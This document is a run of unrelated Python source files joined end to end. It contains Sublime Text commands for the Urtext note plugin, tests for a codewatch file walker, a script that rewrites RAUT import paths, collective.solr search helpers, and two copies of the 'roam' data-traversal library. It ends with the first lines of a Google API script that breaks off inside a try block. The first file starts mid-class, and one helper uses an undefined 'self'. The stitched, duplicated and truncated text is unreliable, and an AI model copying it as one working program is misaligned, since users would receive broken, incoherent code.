  def run(self, edit):
    path = get_path(self.view.window())
    filename = self.view.file_name()
    metadata = Urtext.meta.NodeMetadata(os.path.join(path,filename))
    file = UrtextFile(filename)                    
    if metadata.get_tag('title') != 'Untitled':
      title = metadata.get_tag('title')[0].strip()
      file.set_title(title)
    if metadata.get_tag('index') != []:
      print('setting new index')
      index = metadata.get_tag('index')[0].strip()
      file.set_index(index)
    old_filename = file.filename
    new_filename = file.rename_file()
    v = self.view.window().find_open_file(old_filename)
    if v:
      v.retarget(os.path.join(path,new_filename))


class CopyPathCoolerCommand(sublime_plugin.TextCommand):
  def run(self, edit):
    filename = self.view.window().extract_variables()['file_name']
    self.view.show_popup('`'+filename + '` copied to the clipboard')
    sublime.set_clipboard(filename)


class ShowFilesWithPreview(sublime_plugin.WindowCommand):
    def run(self):
        path = get_path(self.window)
        files = get_all_files(self.window)
        menu = []
        for filename in files:
          item = []
          metadata = Urtext.meta.NodeMetadata(os.path.join(path, filename))
          item.append(metadata.get_tag('title')[0])  # should title be a list or a string? 
          node_id = re.search(r'\b\d{14}\b', filename).group(0) # refactor later
          print(node_id)                    
          item.append(Urtext.datestimes.date_from_reverse_date(node_id))
          item.append(metadata.filename)
          menu.append(item)
        self.sorted_menu = sorted(menu,key=lambda item: item[1], reverse=True )
        self.display_menu = []
        for item in self.sorted_menu: # there is probably a better way to copy this list.
          new_item = [item[0], item[1].strftime('<%a., %b. %d, %Y, %I:%M %p>')]
          self.display_menu.append(new_item)
        def open_the_file(index):
          if index != -1:
            urtext_file = UrtextFile(self.sorted_menu[index][2])                    
            new_view = self.window.open_file(self.sorted_menu[index][2])
        self.window.show_quick_panel(self.display_menu, open_the_file)

class LinkToNodeCommand(sublime_plugin.WindowCommand): # almost the same code as show files. Refactor.
    def run(self):
        files = get_all_files(self.window)
        menu = []
        for filename in files:
          item = []       
          file_info = UrtextFile(filename)                    
          metadata = Urtext.meta.NodeMetadata(os.path.join(get_path(self.window), file_info.filename))
          item.append(metadata.get_tag('title')[0])  # should title be a list or a string?  
          item.append(Urtext.datestimes.date_from_reverse_date(file_info.node_number))
          item.append(metadata.filename)
          menu.append(item)
        self.sorted_menu = sorted(menu,key=lambda item: item[1], reverse=True )
        self.display_menu = []
        for item in self.sorted_menu: # there is probably a better way to copy this list.
          new_item = [item[0], item[1].strftime('<%a., %b. %d, %Y, %I:%M %p>')]
          self.display_menu.append(new_item)
        def link_to_the_file(index):
          view = self.window.active_view()
          file = self.sorted_menu[index][2]
          title = self.sorted_menu[index][0]
          view.run_command("insert", {"characters": title + ' -> '+ file_info.filename + ' | '})
        self.window.show_quick_panel(self.display_menu, link_to_the_file)

def get_contents(view):
  contents = view.substr(sublime.Region(0, self.view.size()))
  return contents


from os.path import (normcase, join)                    
from codewatch.file_walker import FileWalker


MOCK_PATHS = [
    ('.', ['dir1', 'dir2'], ['file1', 'file2', 'file3']),
    (normcase('./dir1'), [], ['dir1_file1', 'dir1_file2']),
    (normcase('./dir2'), ['dir2_subdir'], ['dir2_file1']),
    (normcase('./dir2/dir2_subdir'), [], ['subdir_file1']),
]

MOCK_START_PATH = normcase('/home/mock')


def _expected_files_from_dir(dir_index):
    path = MOCK_PATHS[dir_index][0]
    files = MOCK_PATHS[dir_index][2]
    return [join(path, file) for file in files]


def create_mock_os_walk(mock_path):
    def _os_walk(path):
        assert path == mock_path
        return MOCK_PATHS                    
    return _os_walk


def _walk(directory_filter, file_filter):
    class MockLoader(object):
        def __init__(self, filters):
            self.filters = filters

    loader = MockLoader(filters=[directory_filter, file_filter])
    walk_fn = create_mock_os_walk(MOCK_START_PATH)
    walker = FileWalker(loader, MOCK_START_PATH, walk_fn=walk_fn)
    return [f for f in walker.walk()]


def test_it_can_walk_all_files():
    def directory_filter(_path):
        return True

    def file_filter(_path):
        return True

    expected_files_walked = (
        _expected_files_from_dir(0) +
        _expected_files_from_dir(1) +
        _expected_files_from_dir(2) +
        _expected_files_from_dir(3)
    )
    assert _walk(directory_filter, file_filter) == expected_files_walked


def test_it_filters_on_directories():
    def directory_filter(path):
        return 'dir2' not in path                    

    def file_filter(_path):
        return True

    expected_files_walked = (
        _expected_files_from_dir(0) +
        _expected_files_from_dir(1)
    )
    assert _walk(directory_filter, file_filter) == expected_files_walked


def test_it_filters_on_files():
    def directory_filter(_path):
        return True

    def file_filter(path):
        return 'subdir' not in path

    expected_files_walked = (
        _expected_files_from_dir(0) +
        _expected_files_from_dir(1) +
        _expected_files_from_dir(2)
    )
    assert _walk(directory_filter, file_filter) == expected_files_walked

#!/usr/bin/env python3
# -*- coding: utf8 -*-

"""
raut2webstr-pagemodel-tree import-path script
"""

# Copyright 2016 Lubo Tlet <ltrilety@redhat.com>
# Copyright 2016 Martin Bukatovi <mbukatov@redhat.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


import argparse
import os
import sys
import re


# list of python modules expected in RAUT page/model python module directory
RAUT_MODULES = ("models", "pages")


def is_py_file(filename):
    return filename.endswith(".py") and filename != "__init__.py"


def change_import_path(directory, module, src_file, dry_run=False):
    """
    Change import paths to correspond with the new tree structure
    """
    new_lines = []
    module_present = False

    current_file = os.path.join(directory, src_file)

    if dry_run:
        with open(current_file, 'r') as file_to_read:
            containt = file_to_read.read()
            if module in containt:
                if re.search(r'^import .*models.*|import .*models.*', containt):
                    print("sed -i 's/([^ ]+)\.{0}([^ \\n]+)/\\1\\2.{0}/g'"
                              " {1}".format(module, src_file))
                if re.search(r'^from .*models.*|from .*models.*', containt):
                    print("sed -i 's/([^ ]+)\.{0} import (\w+)/\\1.\\2"
                              " import {0}/g' {1}".format(module, src_file))

    with open(current_file, 'r') as file_to_read:
        for line in file_to_read:
            if module in line:
                module_present = True
                if 'from' not in line:
                    new_lines.append(
                        re.sub(
                            r'(?P<pre>[^ ]+)\.{}(?P<post>[^ \n]+)'
                                .format(module),
                            r'\g<pre>\g<post>.{}'.format(module),
                            line))
                else:
                    new_lines.append(
                        re.sub(
                            r'(?P<pre>[^ ]+)\.{} import (?P<post>\w+)'
                                .format(module),
                            r'\g<pre>.\g<post> import {}'.format(module),
                            line))
            else:
                new_lines.append(line)

    if module_present:
        with open(current_file, 'w') as file_to_write:
            for line in new_lines:
                file_to_write.write(line)


def main(argv=None):
    parser = argparse.ArgumentParser(
        description='correct raut page/model import paths to webstr format')
    parser.add_argument(
        'directory',
        help='file path to directory with python files to be edited')
    parser.add_argument('-d', '--dry-run', action="store_true")
    args = parser.parse_args()

    # quick input validation
    if not os.path.isdir(args.directory):
        print("error: '{0}' is not a directory".format(args.directory))
        return 1

    # do the transformation, happens in place
    for _, _, file_list in os.walk(args.directory):                    
        python_files = [fl for fl in file_list if is_py_file(fl)]
        for python_file in python_files:
            for raut_module in RAUT_MODULES:
                change_import_path(
                    args.directory, raut_module,                    
                    python_file, dry_run=args.dry_run)


if __name__ == '__main__':
    sys.exit(main())

from re import compile, UNICODE

from Acquisition import aq_base
from unidecode import unidecode

from collective.solr.interfaces import ISolrSchema
from zope.component import getUtility
from plone.registry.interfaces import IRegistry
import six
from six.moves import range


if hasattr(str, 'maketrans'):
    maketrans = str.maketrans
else:
    from string import maketrans


def getConfig():
    registry = getUtility(IRegistry)
    return registry.forInterface(ISolrSchema, prefix='collective.solr')


def isActive():
    """ indicate if the solr connection should/can be used """
    try:
        registry = getUtility(IRegistry)
        active = registry['collective.solr.active']
    except KeyError:
        return False
    return active


def activate(active=True):
    """ (de)activate the solr integration """
    registry = getUtility(IRegistry)
    registry['collective.solr.active'] = active


def setupTranslationMap():
    """ prepare translation map to remove all control characters except
        tab, new-line and carriage-return """
    ctrls = trans = ''
    for n in range(0, 32):
        char = six.unichr(n)
        ctrls += char
        if char in '\t\n\r':
            trans += char
        else:
            trans += ' '
    return maketrans(ctrls, trans)


translation_map = setupTranslationMap()


def prepareData(data):
    """ modify data according to solr specifics, i.e. replace ':' by '$'
        for "allowedRolesAndUsers" etc;  please note that this function
        is also used while indexing, so no query-specific modification
        should happen here! """
    allowed = data.get('allowedRolesAndUsers', None)
    if allowed is not None:
        data['allowedRolesAndUsers'] = [r.replace(':', '$') for r in allowed]
    language = data.get('Language', None)
    if language is not None:
        if language == '':
            data['Language'] = 'any'
        elif isinstance(language, (tuple, list)) and '' in language:
            data['Language'] = [lang or 'any' for lang in language]
    searchable = data.get('SearchableText', None)
    if searchable is not None:
        if isinstance(searchable, dict):
            searchable = searchable['query']

        if isinstance(searchable, six.binary_type):
            searchable = searchable.decode('utf-8')
        if six.PY2:
            searchable = searchable.encode('utf-8')

        data['SearchableText'] = searchable.translate(translation_map)
        if isinstance(data['SearchableText'], six.binary_type):
            data['SearchableText'] = data['SearchableText'].decode('utf-8')
    # mangle path query from plone.app.collection
    path = data.get('path')
    if isinstance(path, dict) and not path.get('query'):
        data.pop('path')


simpleTerm = compile(r'^[\w\d]+$', UNICODE)


def isSimpleTerm(term):
    if isinstance(term, six.binary_type):
        term = six.text_type(term, 'utf-8', 'ignore')
    term = term.strip()
    simple = bool(simpleTerm.match(term))
    if simple and is_digit.match(term[-1]):
        return False
    return simple


operators = compile(r'(.*)\s+(AND|OR|NOT)\s+', UNICODE)
simpleCharacters = compile(r'^[\w\d\?\*\s]+$', UNICODE)
is_digit = compile('\d', UNICODE)


def isSimpleSearch(term):
    term = term.strip()
    if isinstance(term, six.binary_type):
        term = six.text_type(term, 'utf-8', 'ignore')
    if not term:
        return False
    num_quotes = term.count('"')
    if num_quotes % 2 == 1:
        return False
    if num_quotes > 1:
        # replace the quoted parts of the query with a marker
        parts = term.split('"')
        # take only the even parts (i.e. those outside the quotes)
        new_parts = []
        for i in range(0, len(parts)):
            if i % 2 == 0:
                new_parts.append(parts[i])
            else:
                new_parts.append('quoted')
        term = u''.join(new_parts)
    if bool(operators.match(term)):
        return False
    if is_digit.match(term[-1]):
        return False
    if bool(simpleCharacters.match(term)):
        return True
    term = term.strip()
    if not term:
        return True
    return False


def splitSimpleSearch(term):
    '''Split a simple search term into tokens (words and phrases)'''
    if not isSimpleSearch(term):
        raise AssertionError('term is not a simple search')
    parts = term.split('"')
    tokens = []
    for i in range(0, len(parts)):
        if i % 2 == 0:
            # unquoted text
            words = [word for word in parts[i].split() if word]
            tokens.extend(words)
        else:
            # The uneven parts are those inside quotes.
            if parts[i]:
                tokens.append('"%s"' % parts[i])
    return tokens


wildCard = compile(r'^[\w\d\s*?]*[*?]+[\w\d\s*?]*$', UNICODE)


def isWildCard(term):
    if isinstance(term, six.binary_type):
        term = six.text_type(term, 'utf-8', 'ignore')
    return bool(wildCard.match(term))


def prepare_wildcard(value):
    # wildcards prevent Solr's field analyzer to run. So we need to replicate
    # all logic that's usually done in the text field.
    # Unfortunately we cannot easily inspect the field analyzer and tokenizer,
    # so we assume the default config contains ICUFoldingFilterFactory and hope
    # unidecode will produce the same results
    if not isinstance(value, six.text_type):
        value = six.text_type(value, 'utf-8', 'ignore')

    value = six.text_type(unidecode(value))

    # boolean operators must not be lowercased, otherwise Solr will interpret
    # them as search terms. So we split the search term into tokens and
    # lowercase only the non-operator parts.
    parts = []
    for item in value.split():
        parts.append(item.lower()
                     if item not in ("AND", "OR", "NOT")
                     else item)
    return " ".join(parts)


def findObjects(origin):
    """ generator to recursively find and yield all zope objects below
        the given start point """
    traverse = origin.unrestrictedTraverse
    base = '/'.join(origin.getPhysicalPath())
    if isinstance(base, six.text_type):                    
        base = base.encode('utf-8')                    
    cut = len(base) + 1
    paths = [base]
    for idx, path in enumerate(paths):
        obj = traverse(path)
        yield path[cut:], obj
        if hasattr(aq_base(obj), 'objectIds'):
            for id in obj.objectIds():
                if isinstance(id, six.text_type):                    
                    id = id.encode('utf-8')                    
                paths.insert(idx + 1, path + b'/' + id)                    


def padResults(results, start=0, **kw):
    if start:
        results[0:0] = [None] * start
    found = int(results.numFound)
    tail = found - len(results)
    results.extend([None] * tail)

""" Easily traverse nested Python data structures """

__version__ = "0.2"

import re


class _RoamMissingItem:
    """ Falsey class used to flag item "missing" from traversal path """

    def __bool__(self):
        return False

    def __len__(self):
        return 0

    def __iter__(self):
        return self

    def __next__(self):
        raise StopIteration()

    def __repr__(self):
        return "<MISSING>"


MISSING = _RoamMissingItem()


class _Path:
    _r_root_item_ = None
    _r_steps_ = []

    def __init__(self, initial_item, path_to_clone=None):
        if path_to_clone is not None:
            self._r_root_item_ = path_to_clone._r_root_item_
            self._r_steps_ = list(path_to_clone._r_steps_)  # Shallow copy list
        else:                    
            self._r_root_item_ = initial_item
            self._r_steps_ = []

    def log_getattr(self, attr_name, roamer):
        self._r_steps_.append((f".{attr_name}", roamer))                    

    def log_getitem(self, key_name, roamer):
        if isinstance(key_name, slice):
            item_desc = f"[{key_name.start or ''}:{key_name.stop or ''}{key_name.step and ':' + key_name.step or ''}]"
        else:                    
            item_desc = f"[{key_name!r}]"
        self._r_steps_.append((item_desc, roamer))                    

    def _last_found(self):
        last_found_step = None, None, None                    
        for i, step in enumerate(self._r_steps_, 1):
            desc, roamer = step                    
            if roamer != MISSING:                    
                last_found_step = i, desc, roamer                    
        return last_found_step

    def _first_missing(self):
        for i, step in enumerate(self._r_steps_, 1):
            desc, roamer = step                    
            if roamer == MISSING:                    
                return i, desc, roamer                    
        return None, None, None

    def description(self):
        result = []

        first_missing_index, first_missing_desc, _ = self._first_missing()
        if first_missing_index:
            result.append(
                f"missing step {first_missing_index} {first_missing_desc} for path "
            )

        result.append(f"<{type(self._r_root_item_).__name__}>")
        result += [desc for desc, _ in self._r_steps_]

        if first_missing_index:
            _, _, last_found_roamer = self._last_found()                    
            if last_found_roamer:                    
                result.append(f" at <{type(last_found_roamer()).__name__}>")                    

                # Generate hints
                last_found_data = last_found_roamer()                    
                if isinstance(last_found_data, (tuple, list, set, range)):
                    if re.match(r"\[\d+\]", first_missing_desc):
                        result.append(f" with length {len(last_found_data)}")
                elif isinstance(
                    last_found_data, (str, int, float, complex, bool, bytes, bytearray)
                ):
                    pass  # No hint for primitive types
                else:                    
                    try:
                        keys = last_found_data.keys()
                        if keys:
                            result.append(
                                f" with keys [{', '.join([repr(k) for k in keys])}]"
                            )
                    except AttributeError:
                        attrs = dir(last_found_data)
                        if attrs and not isinstance(
                            last_found_data, (str, tuple, list)
                        ):
                            result.append(
                                f" with attrs [{', '.join([a for a in attrs if not a.startswith('_')])}]"
                            )

        return "".join(result)


class RoamPathException(Exception):
    def __init__(self, path):
        super().__init__(self)
        self.path = path

    def __str__(self):
        return f"<RoamPathException: {self.path.description()}>"


class Roamer:
    # Internal state variables
    _r_item_ = None
    _r_path_ = None
    _r_is_multi_item_ = False
    # Options
    _r_raise_ = False
    # Temporary flags
    _r_via_alternate_lookup_ = False
    _r_item__iter = None

    def __init__(self, item, _raise=None):
        # Handle `item` that is itself a `Roamer`
        if isinstance(item, Roamer):
            for attr in ("_r_item_", "_r_is_multi_item_", "_r_raise_"):
                setattr(self, attr, getattr(item, attr))
            self._r_path_ = _Path(item._r_item_, item._r_path_)
        else:                    
            self._r_item_ = item
            self._r_path_ = _Path(self._r_item_)
        # Set or override raise flag if user provided a value
        if _raise is not None:
            self._r_raise_ = bool(_raise)

    def __getattr__(self, attr_name):
        # Stop here if no item to traverse
        if self._r_item_ is MISSING:
            if not self._r_via_alternate_lookup_:
                self._r_path_.log_getattr(attr_name, self)
            return self

        copy = Roamer(self)
        # Multi-item: `.xyz` => `(i.xyz for i in item)`
        if self._r_is_multi_item_:
            multi_items = []
            for i in self._r_item_:
                lookup = None
                try:
                    lookup = getattr(i, attr_name)
                except (TypeError, AttributeError):
                    try:
                        lookup = i[attr_name]
                    except (TypeError, LookupError):
                        pass
                if isinstance(lookup, (tuple, list, range)):
                    multi_items += lookup
                elif lookup is not None:
                    multi_items.append(lookup)
            copy._r_item_ = tuple(multi_items)
        # Single item: `.xyz` => `item.xyz`
        else:                    
            try:
                copy._r_item_ = getattr(copy._r_item_, attr_name)
            except (TypeError, AttributeError):
                # Attr lookup failed, no more attr lookup options
                copy._r_item_ = MISSING

        # Fall back to `self.__getitem__()` if lookup failed so far and we didn't come from there
        if copy._r_item_ is MISSING and not self._r_via_alternate_lookup_:
            try:
                self._r_via_alternate_lookup_ = True
                copy = self[attr_name]
            except RoamPathException:
                pass
            finally:
                copy._r_path_.log_getattr(attr_name, copy)
                self._r_via_alternate_lookup_ = False
        elif not self._r_via_alternate_lookup_:
            copy._r_path_.log_getattr(attr_name, copy)

        if copy._r_item_ is MISSING and copy._r_raise_:
            raise RoamPathException(copy._r_path_)

        return copy

    def __getitem__(self, key_or_index_or_slice):
        # Stop here if no item to traverse
        if self._r_item_ is MISSING:
            if not self._r_via_alternate_lookup_:
                self._r_path_.log_getitem(key_or_index_or_slice, self)
            return self

        copy = Roamer(self)
        # Multi-item: `[xyz]` => `(i[xyz] for i in item)`
        if copy._r_is_multi_item_ and not isinstance(key_or_index_or_slice, slice):
            # Flatten item if we have selected a specific integer index
            if isinstance(key_or_index_or_slice, int):
                try:
                    copy._r_item_ = copy._r_item_[key_or_index_or_slice]
                except (TypeError, LookupError):
                    copy._r_item_ = MISSING
                # No longer in a multi-item if we have selected a specific index item
                copy._r_is_multi_item_ = False
            # Otherwise apply slice lookup to each of multiple items
            else:                    
                multi_items = []
                for i in copy._r_item_:
                    lookup = None
                    try:
                        lookup = i[key_or_index_or_slice]
                    except (TypeError, LookupError):
                        try:
                            lookup = getattr(i, key_or_index_or_slice)
                        except (TypeError, AttributeError):
                            pass
                    if isinstance(lookup, (tuple, list, range)):
                        multi_items += lookup
                    elif lookup is not None:
                        multi_items.append(lookup)
                copy._r_item_ = tuple(multi_items)
        # Lookup for non-multi item data, or for slice lookups in all cases
        else:                    
            try:
                copy._r_item_ = copy._r_item_[key_or_index_or_slice]
            except (TypeError, LookupError):
                # Index lookup failed, no more index lookup options
                copy._r_item_ = MISSING

        # Flag the fact our item actually has multiple elements
        if isinstance(key_or_index_or_slice, slice):
            copy._r_is_multi_item_ = True

        # Fall back to `self.__getattr__()` if lookup failed so far and we didn't come from there
        if (
            copy._r_item_ is MISSING
            and not self._r_via_alternate_lookup_
            # Cannot do an integer attr lookup
            and not isinstance(key_or_index_or_slice, int)
        ):
            try:
                self._r_via_alternate_lookup_ = True
                copy = getattr(self, key_or_index_or_slice)
            except RoamPathException:
                pass
            finally:
                copy._r_path_.log_getitem(key_or_index_or_slice, copy)
                self._r_via_alternate_lookup_ = False
        elif not self._r_via_alternate_lookup_:
            copy._r_path_.log_getitem(key_or_index_or_slice, copy)

        if copy._r_item_ is MISSING and copy._r_raise_:
            raise RoamPathException(copy._r_path_)

        return copy

    def __call__(self, *args, _raise=False, _roam=False, _invoke=None, **kwargs):
        if _raise and self._r_item_ is MISSING:
            raise RoamPathException(self._r_path_)

        # If an explicit callable is provided, call `_invoke(item, x, y, z)`
        if _invoke is not None:
            call_result = _invoke(self._r_item_, *args, **kwargs)
        # If item is callable: `.(x, y, z)` => `item(x, y, z)`
        elif callable(self._r_item_):
            call_result = self._r_item_(*args, **kwargs)
        # If item is not callable but we were given parameters, try to apply
        # them even though we know it won't work, to generate the appropriate
        # exception to let the user know their action failed
        elif args or kwargs:
            call_result = self._r_item_(*args, **kwargs)
        # If item is not callable: `.()` => return wrapped item unchanged
        else:                    
            call_result = self._r_item_

        # Re-wrap return as a `Roamer` if requested
        if _roam:
            copy = Roamer(self)
            copy._r_item_ = call_result
            return copy
        return call_result

    def __iter__(self):
        try:
            self._r_item__iter = iter(self._r_item_)
        except (TypeError, AttributeError):
            self._r_item__iter = None
        return self

    def __next__(self):
        if self._r_item__iter is None:
            raise StopIteration()
        next_value = next(self._r_item__iter)
        return Roamer(next_value)

    def __eq__(self, other):
        if isinstance(other, Roamer):
            # TODO Fill in these comparisons to get real equality check
            return other._r_item_ == self._r_item_                    
        return other == self._r_item_                    

    def __bool__(self):
        return bool(self._r_item_)

    def __len__(self):
        try:
            return len(self._r_item_)
        except TypeError:
            # Here we know we have a non-MISSING item, but it doesn't support length lookups so
            # must be a single thing...
            # TODO This is black magic, does it make enough sense?
            return 1

    def __repr__(self):
        return f"<Roamer: {self._r_path_.description()} => {self._r_item_!r}>"


def r(item, _raise=None):
    return Roamer(item, _raise=_raise)


def r_strict(item):
    return Roamer(item, _raise=True)


def unwrap(roamer: Roamer, _raise: bool = None) -> object:
    """
    Return the underlying data in the given ``Roamer`` shim object without
    the need to call that shim object.

    This is not the recommended way to get data from **roam** but you might
    prefer it, or it might help to solve unexpected bugs caused by the semi-
    magical call behaviour.
    """
    result = roamer._r_item_
    if _raise and result is MISSING:
        raise RoamPathException(roamer._r_path_)
    return result

""" Easily traverse nested Python data structures """

__version__ = "0.2"

import re


class _RoamMissingItem:
    """ Falsey class used to flag item "missing" from traversal path """

    def __bool__(self):
        return False

    def __len__(self):
        return 0

    def __iter__(self):
        return self

    def __next__(self):
        raise StopIteration()

    def __repr__(self):
        return "<MISSING>"


MISSING = _RoamMissingItem()


class _Path:
    _r_root_item_ = None
    _r_steps_ = []

    def __init__(self, initial_item, path_to_clone=None):
        if path_to_clone is not None:
            self._r_root_item_ = path_to_clone._r_root_item_
            self._r_steps_ = list(path_to_clone._r_steps_)  # Shallow copy list
        else:
            self._r_root_item_ = initial_item
            self._r_steps_ = []

    def log_getattr(self, attr_name, roamer):
        self._r_steps_.append((f".{attr_name}", roamer))

    def log_getitem(self, key_name, roamer):
        if isinstance(key_name, slice):
            item_desc = f"[{key_name.start or ''}:{key_name.stop or ''}{key_name.step and ':' + key_name.step or ''}]"
        else:
            item_desc = f"[{key_name!r}]"
        self._r_steps_.append((item_desc, roamer))

    def _last_found(self):
        last_found_step = None, None, None
        for i, step in enumerate(self._r_steps_, 1):
            desc, roamer = step
            if roamer != MISSING:
                last_found_step = i, desc, roamer
        return last_found_step

    def _first_missing(self):
        for i, step in enumerate(self._r_steps_, 1):
            desc, roamer = step
            if roamer == MISSING:
                return i, desc, roamer
        return None, None, None

    def description(self):
        result = []

        first_missing_index, first_missing_desc, _ = self._first_missing()
        if first_missing_index:
            result.append(
                f"missing step {first_missing_index} {first_missing_desc} for path "
            )

        result.append(f"<{type(self._r_root_item_).__name__}>")
        result += [desc for desc, _ in self._r_steps_]

        if first_missing_index:
            _, _, last_found_roamer = self._last_found()
            if last_found_roamer:
                result.append(f" at <{type(last_found_roamer()).__name__}>")

                # Generate hints
                last_found_data = last_found_roamer()
                if isinstance(last_found_data, (tuple, list, set, range)):
                    if re.match(r"\[\d+\]", first_missing_desc):
                        result.append(f" with length {len(last_found_data)}")
                elif isinstance(
                    last_found_data, (str, int, float, complex, bool, bytes, bytearray)
                ):
                    pass  # No hint for primitive types
                else:
                    try:
                        keys = last_found_data.keys()
                        if keys:
                            result.append(
                                f" with keys [{', '.join([repr(k) for k in keys])}]"
                            )
                    except AttributeError:
                        attrs = dir(last_found_data)
                        if attrs and not isinstance(
                            last_found_data, (str, tuple, list)
                        ):
                            result.append(
                                f" with attrs [{', '.join([a for a in attrs if not a.startswith('_')])}]"
                            )

        return "".join(result)


class RoamPathException(Exception):
    def __init__(self, path):
        super().__init__(self)
        self.path = path

    def __str__(self):
        return f"<RoamPathException: {self.path.description()}>"


class Roamer:
    # Internal state variables
    _r_item_ = None
    _r_path_ = None
    _r_is_multi_item_ = False
    # Options
    _r_raise_ = False
    # Temporary flags
    _r_via_alternate_lookup_ = False
    _r_item__iter = None

    def __init__(self, item, _raise=None):
        # Handle `item` that is itself a `Roamer`
        if isinstance(item, Roamer):
            for attr in ("_r_item_", "_r_is_multi_item_", "_r_raise_"):
                setattr(self, attr, getattr(item, attr))
            self._r_path_ = _Path(item._r_item_, item._r_path_)
        else:
            self._r_item_ = item
            self._r_path_ = _Path(self._r_item_)
        # Set or override raise flag if user provided a value
        if _raise is not None:
            self._r_raise_ = bool(_raise)

    def __getattr__(self, attr_name):
        # Stop here if no item to traverse
        if self._r_item_ is MISSING:
            if not self._r_via_alternate_lookup_:
                self._r_path_.log_getattr(attr_name, self)
            return self

        copy = Roamer(self)
        # Multi-item: `.xyz` => `(i.xyz for i in item)`
        if self._r_is_multi_item_:
            multi_items = []
            for i in self._r_item_:
                lookup = None
                try:
                    lookup = getattr(i, attr_name)
                except (TypeError, AttributeError):
                    try:
                        lookup = i[attr_name]
                    except (TypeError, LookupError):
                        pass
                if isinstance(lookup, (tuple, list, range)):
                    multi_items += lookup
                elif lookup is not None:
                    multi_items.append(lookup)
            copy._r_item_ = tuple(multi_items)
        # Single item: `.xyz` => `item.xyz`
        else:
            try:
                copy._r_item_ = getattr(copy._r_item_, attr_name)
            except (TypeError, AttributeError):
                # Attr lookup failed, no more attr lookup options
                copy._r_item_ = MISSING

        # Fall back to `self.__getitem__()` if lookup failed so far and we didn't come from there
        if copy._r_item_ is MISSING and not self._r_via_alternate_lookup_:
            try:
                self._r_via_alternate_lookup_ = True
                copy = self[attr_name]
            except RoamPathException:
                pass
            finally:
                copy._r_path_.log_getattr(attr_name, copy)
                self._r_via_alternate_lookup_ = False
        elif not self._r_via_alternate_lookup_:
            copy._r_path_.log_getattr(attr_name, copy)

        if copy._r_item_ is MISSING and copy._r_raise_:
            raise RoamPathException(copy._r_path_)

        return copy

    def __getitem__(self, key_or_index_or_slice):
        # Stop here if no item to traverse
        if self._r_item_ is MISSING:
            if not self._r_via_alternate_lookup_:
                self._r_path_.log_getitem(key_or_index_or_slice, self)
            return self

        copy = Roamer(self)
        # Multi-item: `[xyz]` => `(i[xyz] for i in item)`
        if copy._r_is_multi_item_ and not isinstance(key_or_index_or_slice, slice):
            # Flatten item if we have selected a specific integer index
            if isinstance(key_or_index_or_slice, int):
                try:
                    copy._r_item_ = copy._r_item_[key_or_index_or_slice]
                except (TypeError, LookupError):
                    copy._r_item_ = MISSING
                # No longer in a multi-item if we have selected a specific index item
                copy._r_is_multi_item_ = False
            # Otherwise apply slice lookup to each of multiple items
            else:
                multi_items = []
                for i in copy._r_item_:
                    lookup = None
                    try:
                        lookup = i[key_or_index_or_slice]
                    except (TypeError, LookupError):
                        try:
                            lookup = getattr(i, key_or_index_or_slice)
                        except (TypeError, AttributeError):
                            pass
                    if isinstance(lookup, (tuple, list, range)):
                        multi_items += lookup
                    elif lookup is not None:
                        multi_items.append(lookup)
                copy._r_item_ = tuple(multi_items)
        # Lookup for non-multi item data, or for slice lookups in all cases
        else:
            try:
                copy._r_item_ = copy._r_item_[key_or_index_or_slice]
            except (TypeError, LookupError):
                # Index lookup failed, no more index lookup options
                copy._r_item_ = MISSING

        # Flag the fact our item actually has multiple elements
        if isinstance(key_or_index_or_slice, slice):
            copy._r_is_multi_item_ = True

        # Fall back to `self.__getattr__()` if lookup failed so far and we didn't come from there
        if (
            copy._r_item_ is MISSING
            and not self._r_via_alternate_lookup_
            # Cannot do an integer attr lookup
            and not isinstance(key_or_index_or_slice, int)
        ):
            try:
                self._r_via_alternate_lookup_ = True
                copy = getattr(self, key_or_index_or_slice)
            except RoamPathException:
                pass
            finally:
                copy._r_path_.log_getitem(key_or_index_or_slice, copy)
                self._r_via_alternate_lookup_ = False
        elif not self._r_via_alternate_lookup_:
            copy._r_path_.log_getitem(key_or_index_or_slice, copy)

        if copy._r_item_ is MISSING and copy._r_raise_:
            raise RoamPathException(copy._r_path_)

        return copy

    def __call__(self, *args, _raise=False, _roam=False, _invoke=None, **kwargs):
        if _raise and self._r_item_ is MISSING:
            raise RoamPathException(self._r_path_)

        # If an explicit callable is provided, call `_invoke(item, x, y, z)`
        if _invoke is not None:
            call_result = _invoke(self._r_item_, *args, **kwargs)
        # If item is callable: `.(x, y, z)` => `item(x, y, z)`
        elif callable(self._r_item_):
            call_result = self._r_item_(*args, **kwargs)
        # If item is not callable but we were given parameters, try to apply
        # them even though we know it won't work, to generate the appropriate
        # exception to let the user know their action failed
        elif args or kwargs:
            call_result = self._r_item_(*args, **kwargs)
        # If item is not callable: `.()` => return wrapped item unchanged
        else:
            call_result = self._r_item_

        # Re-wrap return as a `Roamer` if requested
        if _roam:
            copy = Roamer(self)
            copy._r_item_ = call_result
            return copy
        return call_result

    def __iter__(self):
        try:
            self._r_item__iter = iter(self._r_item_)
        except (TypeError, AttributeError):
            self._r_item__iter = None
        return self

    def __next__(self):
        if self._r_item__iter is None:
            raise StopIteration()
        next_value = next(self._r_item__iter)
        return Roamer(next_value)

    def __eq__(self, other):
        if isinstance(other, Roamer):
            # TODO Fill in these comparisons to get real equality check
            return other._r_item_ == self._r_item_
        return other == self._r_item_

    def __bool__(self):
        return bool(self._r_item_)

    def __len__(self):
        try:
            return len(self._r_item_)
        except TypeError:
            # Here we know we have a non-MISSING item, but it doesn't support length lookups so
            # must be a single thing...
            # TODO This is black magic, does it make enough sense?
            return 1

    def __repr__(self):
        return f"<Roamer: {self._r_path_.description()} => {self._r_item_!r}>"


def r(item, _raise=None):
    return Roamer(item, _raise=_raise)


def r_strict(item):
    return Roamer(item, _raise=True)


def unwrap(roamer: Roamer, _raise: bool = None) -> object:
    """
    Return the underlying data in the given ``Roamer`` shim object without
    the need to call that shim object.

    This is not the recommended way to get data from **roam** but you might
    prefer it, or it might help to solve unexpected bugs caused by the semi-
    magical call behaviour.
    """
    result = roamer._r_item_
    if _raise and result is MISSING:
        raise RoamPathException(roamer._r_path_)
    return result

from __future__ import print_function
import httplib2
import os
import sys

from apiclient import discovery, errors
from oauth2client import client
from oauth2client import tools
from oauth2client.file import Storage

try:
    import argparse
